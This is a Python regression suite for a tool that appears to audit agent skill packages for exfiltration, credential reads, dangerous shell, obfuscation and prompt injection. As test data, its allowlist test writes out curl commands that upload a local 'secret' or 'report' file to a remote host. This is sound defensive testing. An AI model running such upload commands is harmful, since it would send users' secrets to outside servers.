#!/usr/bin/env python3
"""Zero-dependency regression suite."""

from __future__ import annotations

import sys
import re
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "tests"))
sys.path.insert(0, str(REPO_ROOT / "src"))

from skill_auditor import cli, config as cfg, render_catalog  # noqa: E402
from skill_auditor import rules_loader as rl  # noqa: E402
from skill_auditor.rules_loader import CRITICAL, INFO  # noqa: E402
import cases  # noqa: E402
import security_cases  # noqa: E402

EXPECTED_CATEGORIES = {
    "data-exfiltration", "credential-read", "dangerous-shell", "obfuscation",
    "prompt-injection", "description-mismatch", "logic-bomb",
}


class Results:
    def __init__(self) -> None:
        self.failures: list[str] = []
        self.passed = 0

    def check(self, condition: bool, message: str) -> None:
        if condition:
            self.passed += 1
        else:
            self.failures.append(message)


def test_rule_coverage(results: Results, rules: list[dict]) -> None:
    by_id = {rule["id"]: rule for rule in rules}
    regex_ids = {rule_id for rule_id, rule in by_id.items() if rule.get("_regex")}
    no_regex_ids = set(by_id) - regex_ids
    for rule_id in sorted(regex_ids):
        results.check(rule_id in cases.RULE_CASES,
                      f"coverage: regex rule {rule_id} has no line samples")
    for rule_id in sorted(cases.RULE_CASES):
        results.check(rule_id in by_id, f"coverage: unknown rule {rule_id}")
    for rule_id in sorted(no_regex_ids):
        results.check(rule_id in cases.NO_REGEX_RULES,
                      f"coverage: check rule {rule_id} not declared")


def test_rule_samples(results: Results, rules: list[dict]) -> None:
    by_id = {rule["id"]: rule for rule in rules}
    for rule_id, samples in cases.RULE_CASES.items():
        rule = by_id.get(rule_id)
        if not rule or not rule.get("_regex"):
            continue
        regex = rule["_regex"]
        results.check(bool(samples.get("positive")), f"{rule_id}: missing positive")
        results.check(bool(samples.get("negative")), f"{rule_id}: missing negative")
        for line in samples["positive"]:
            results.check(bool(regex.search(line)), f"{rule_id}: missed {line!r}")
        for line in samples["negative"]:
            results.check(not regex.search(line), f"{rule_id}: false positive {line!r}")


def test_end_to_end(results: Results, rules: list[dict]) -> None:
    malicious = REPO_ROOT / "examples" / "malicious-skill"
    clean = REPO_ROOT / "examples" / "clean-skill"
    report = cli.build_report(
        str(malicious), malicious, rules, min_severity=INFO, fail_on=CRITICAL
    )
    results.check(report["verdict"] == "DO_NOT_INSTALL", "malicious verdict regressed")
    results.check(report["exit_code"] == 2, "malicious exit code regressed")
    for category in EXPECTED_CATEGORIES:
        results.check(report["categories"].get(category, 0) >= 1,
                      f"malicious fixture no longer triggers {category}")
    clean_report = cli.build_report(
        str(clean), clean, rules, min_severity=INFO, fail_on=CRITICAL
    )
    results.check(clean_report["summary"]["total"] == 0, "clean fixture has findings")
    results.check(clean_report["verdict"] == "SAFE_TO_INSTALL", "clean verdict regressed")


def test_trusted_allowlist(results: Results) -> None:
    finding = {
        "rule_id": "EXFIL-001",
        "file": "x.sh",
        "category": "data-exfiltration",
    }
    results.check(
        cfg.Config().suppression_reason(
            finding, "curl https://github.com/org/repo -d @secret"
        ) is None,
        "built-in domain trust still suppresses uploads",
    )
    trusted = cfg.Config(allow_domains=["uploads.example"])
    results.check(
        trusted.suppression_reason(
            finding, "curl https://uploads.example/in -d @report"
        ) is not None,
        "explicit trusted allowlist was not honored",
    )


def test_catalog_and_rule_mirror(results: Results, rules: list[dict]) -> None:
    expected = render_catalog.render(rules)
    actual = render_catalog.OUTPUT.read_text(encoding="utf-8") if render_catalog.OUTPUT.exists() else ""
    results.check(expected == actual, "catalog is stale")
    source_rules = {path.name: path.read_text(encoding="utf-8")
                    for path in (REPO_ROOT / "rules").glob("*.yaml")}
    packaged_rules = {path.name: path.read_text(encoding="utf-8")
                      for path in (REPO_ROOT / "src" / "skill_auditor" / "rules").glob("*.yaml")}
    results.check(source_rules == packaged_rules, "root and packaged rule catalogs differ")


def test_version_consistency(results: Results) -> None:
    from skill_auditor import __version__
    pyproject = (REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8")
    skill = (REPO_ROOT / "SKILL.md").read_text(encoding="utf-8")
    project_match = re.search(r'^version = "([^"]+)"', pyproject, re.MULTILINE)
    skill_match = re.search(r"^\s{2}version:\s*[\"']?([^\s\"']+)", skill, re.MULTILINE)
    results.check(bool(project_match), "pyproject version is missing")
    results.check(bool(skill_match), "SKILL.md version is missing")
    if project_match and skill_match:
        results.check(
            project_match.group(1) == skill_match.group(1) == __version__,
            "package, pyproject, and SKILL.md versions differ",
        )


def main() -> int:
    try:
        rules = rl.load_rules()
    except rl.RuleError as exc:
        print(f"error loading rules: {exc}", file=sys.stderr)
        return 1
    results = Results()
    test_rule_coverage(results, rules)
    test_rule_samples(results, rules)
    test_end_to_end(results, rules)
    test_trusted_allowlist(results)
    security_cases.run_all(results, rules)
    test_catalog_and_rule_mirror(results, rules)
    test_version_consistency(results)
    total = results.passed + len(results.failures)
    if results.failures:
        print(f"[FAIL] {len(results.failures)} of {total} checks failed:")
        for failure in results.failures:
            print(f"  - {failure}")
        return 1
    print(f"[PASS] all {total} checks passed ({len(rules)} rules loaded).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
